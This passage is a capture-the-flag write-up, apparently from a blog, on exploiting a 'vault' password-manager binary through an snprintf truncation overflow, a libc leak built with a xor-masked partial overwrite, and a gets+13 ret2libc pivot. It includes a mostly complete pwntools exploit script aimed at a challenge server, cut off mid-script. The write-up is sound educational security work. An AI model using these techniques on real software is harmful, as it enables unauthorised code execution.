+<p>The reason is written in the <a href="https://linux.die.net/man/3/snprintf">man page</a> of <code>snprintf</code>:</p>
+<pre tabindex="0"><code>If the output was truncated due to this limit then the return value is the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available.
+</code></pre><p>As <code>v4 = &amp;msg[msg_size];</code> the password can be written at an offset from the end of <code>msg</code> on the stack, jumping even the the canary if we want!</p>
+<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<h3 id="overflowing-the-stack">Overflowing the stack<a hidden class="anchor" aria-hidden="true" href="#overflowing-the-stack">#</a></h3>
+<p>Based on these vulnerabilities I wrote a simple payload to override stuff after the canary with some good old &ldquo;A&quot;s.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span> 
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">255</span>
+</span></span></code></pre></div><p>What happens here is that the length returned by snprintf is greater than the size of <code>msg</code>, so our password gets written just after the canary. But now, what&rsquo;s after the canary?</p>
+<p>Well, some saved registers and the return address of course!</p>
+<pre tabindex="0"><code>pop     rbx
+pop     r12
+pop     r13
+pop     r14
+pop     r15
+retn
+</code></pre><pre tabindex="0"><code>00:0000│     0x7fffffffe4f8 ◂— 0x34e276c4e7dbf600
+01:0008│ rsp 0x7fffffffe500 —▸ 0x7fffffffe534 ◂— 0xe7dbf60000000002
+02:0010│     0x7fffffffe508 —▸ 0x555555556650 ◂— 0x632a25642500203e /* &#39;&gt; &#39; */
+03:0018│     0x7fffffffe510 —▸ 0x555555556648 ◂— 0x74697845202e33 /* &#39;3. Exit&#39; */
+04:0020│     0x7fffffffe518 —▸ 0x555555556638 ◂— &#39;2. View Entries&#39;
+05:0028│     0x7fffffffe520 —▸ 0x55555555662b ◂— &#39;1. Add Entry&#39;
+06:0030│     0x7fffffffe528 —▸ 0x555555555327 ◂— jmp 0x555555555250
+</code></pre><p>As you can see these registers contain char* that will be used to print the banner in the <code>main</code> function.</p>
+<h3 id="leaking-libc">Leaking libc<a hidden class="anchor" aria-hidden="true" href="#leaking-libc">#</a></h3>
+<p>These saved registers are really useful when it comes to leaking stuff, as we can partially override one of those to make it point to a libc address somewhere inside the binary and leak it!
+This requires 4 bits of brute-force, due to the fact that the nearest libc address to one of those strings resides in the GOT section of the binary, so we need to perform a partial-override of 2 bytes. ASLR is enabled and it randomizes every bit of the address, except the last 12, that&rsquo;s why we need to brute-force the remaining 4 bits.</p>
+<p>It turns out that we cannot simply write a payload like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> p16(<span style="color:#ae81ff">0x7F70</span>) <span style="color:#75715e"># partial override</span>
+</span></span></code></pre></div><p>This is because the password is not long enough to trigger the overflow.
+We cannot add stuff after the password, otherwise we would break the partial-override, so now what?</p>
+<p>Well, xor comes to the rescue!
+The xor mechanism works as sort of toggle: every time an entry gets viewed the password is xored in memory. This means that viewing an entry twice will leak the xored password and, as we obviously know the original password, we can leak the key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>add_entry(r,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>)
+</span></span><span style="display:flex;"><span>view_entry(r,<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># view first time</span>
+</span></span><span style="display:flex;"><span>hostname, password <span style="color:#f92672">=</span> view_entry(r,<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># view second time</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> xor(password, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>)[:<span style="color:#ae81ff">64</span>]
+</span></span></code></pre></div><p>Now we can write an encrypted payload that upon decryption contains null bytes</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>password <span style="color:#f92672">=</span> p16(<span style="color:#ae81ff">0x7F70</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">253</span> <span style="color:#75715e"># requires 4 bit bruteforce (0x7)</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> xor(password, key)[:<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">252</span>
+</span></span></code></pre></div><p>This way we can submit a 255 bytes long password to <code>scanf</code>, but when viewing it it&rsquo;ll get xored with the key and become our partial-override payload!
+<img alt="libc leak" loading="lazy" src="/posts/writeups/htb25-vault/libc_leak.png"></p>
+<h4 id="avoid-scanf-headaches">Avoid scanf headaches<a hidden class="anchor" aria-hidden="true" href="#avoid-scanf-headaches">#</a></h4>
+<p>This approach is not entirely reliable as sometimes <code>xor(password, key)</code> contains characters that stop the <code>scanf</code>. To avoid headaches I wrote a script to find these characters (yeah, I could have RTFM, but this way was faster).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>to_bytes() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span>
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>		print(i<span style="color:#f92672">.</span>to_bytes()<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>And the result was the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span></code></pre></div><h3 id="the-tedious-path-to-rce">The tedious path to RCE<a hidden class="anchor" aria-hidden="true" href="#the-tedious-path-to-rce">#</a></h3>
+<p>With a libc leak and the ability to override the return address it should be easy to achieve RCE, right?
+Well, no.</p>
+<p>We are not allowed to write more than one null byte in our payload, that&rsquo;s because the first one terminates the password string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pw_len_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(password);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( pw_len_1 <span style="color:#f92672">&gt;</span> pw_space )
+</span></span><span style="display:flex;"><span>	pw_len_1 <span style="color:#f92672">=</span> pw_space;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(v4, password, pw_len_1);
+</span></span></code></pre></div><p><code>strlen</code> calculates the length of a null-terminated string, so no chance of writing multiple null bytes.</p>
+<p>So now it&rsquo;s gadget time :/</p>
+<p>Upon returning from <code>view_entries</code> the registers are set as follows:
+<img alt="registers" loading="lazy" src="/posts/writeups/htb25-vault/registers.png">
+<code>0xdeaddeadbeef</code> is our fake return address, but we also control <code>r12</code>, <code>r13</code>, <code>r14</code>, <code>r15</code> thanks to the 5 pops before return. As I explained above the values of these registers can&rsquo;t contain null bytes, otherwise it terminates the string and the next part of the payload won&rsquo;t be written.</p>
+<p>Unfortunately there are no onegadgets that work, mainly because <code>rbp</code> is set to 1.
+5
+In the end I came across a really interesting thing: looking at the disassembly of <code>do_system</code> I noticed that it moves the first argument (<code>rdi</code>) inside <code>rbx</code> before using it.</p>
+<pre tabindex="0"><code>pwndbg&gt; disass do_system
+Dump of assembler code for function do_system:
+	0x00007ffff7c50900 &lt;+0&gt;:	push   r15
+	...
+	0x00007ffff7c5092b &lt;+43&gt;:	mov    rbx,rdi
+	...
+</code></pre><p>This gave me an idea, what if that depends on the compiler and every libc function does that before using the contents of <code>rdi</code>?</p>
+<p>Looking at <code>gets</code> it turns out it does!</p>
+<pre tabindex="0"><code>pwndbg&gt; disass gets
+Dump of assembler code for function _IO_gets:
+Address range 0x7ffff7c80520 to 0x7ffff7c80699:
+   0x00007ffff7c80520 &lt;+0&gt;:	endbr64
+   0x00007ffff7c80524 &lt;+4&gt;:	push   r13
+   0x00007ffff7c80526 &lt;+6&gt;:	push   r12
+   0x00007ffff7c80528 &lt;+8&gt;:	push   rbp
+   0x00007ffff7c80529 &lt;+9&gt;:	push   rbx
+   0x00007ffff7c8052a &lt;+10&gt;:	mov    rbx,rdi // MOVES RDI in RBX!!!
+   0x00007ffff7c8052d &lt;+13&gt;:	sub    rsp,0x18
+</code></pre><p>As <code>rbx</code> points on the stack just after <code>rsp</code>, if we jump at <code>gets+13</code> we are basically calling <code>gets(rbx)</code> and writing on the stack frame of gets.
+We can override it&rsquo;s return address and create a ret2libc payload. We aren&rsquo;t restricted by null bytes this time!</p>
+<h3 id="final-expolit">Final expolit<a hidden class="anchor" aria-hidden="true" href="#final-expolit">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;vault_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;glibc/libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.35.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NC_CMD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nc 94.237.59.147 52373&#34;</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">breakrva 0x1843
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path], gdbscript<span style="color:#f92672">=</span>gdbscript, aslr<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(NC_CMD<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#ae81ff">1</span>], int(NC_CMD<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#ae81ff">2</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_entry</span>(r, url: bytes, password: bytes):
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;URL: &#34;</span>, url)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Password: &#34;</span>, password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_entry</span>(r, index: int):
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index: &#34;</span>, str(index)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hostname:  &#34;</span>)
+</span></span><span style="display:flex;"><span>    hostname <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Password:    &#34;</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hostname, password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    add_entry(r,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>)
+</span></span><span style="display:flex;"><span>    view_entry(r,<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hostname, password <span style="color:#f92672">=</span> view_entry(r,<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> xor(password, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">255</span>)[:<span style="color:#ae81ff">64</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;key: </span><span style="color:#e6db74">{</span>key<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># insert a password 255 chars long that xored with the key results in a \x00 at position 3</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span>  p16(<span style="color:#ae81ff">0x7F70</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">253</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> xor(payload, key)[:<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">252</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    print(payload)
+</span></span><span style="display:flex;"><span>    add_entry(r, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>    hostname, password <span style="color:#f92672">=</span> view_entry(r, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index: &#34;</span>, str(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x80e50</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;G&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets<span style="color:#f92672">+</span><span style="color:#ae81ff">13</span>)[:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">217</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> xor(payload, key)[:<span style="color:#ae81ff">39</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">216</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
+</span></span><span style="display:flex;"><span>    add_entry(r, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>    hostname, password <span style="color:#f92672">=</span> view_entry(r, <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2&#34;</span>)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    POP_RDI <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002a3e5</span>
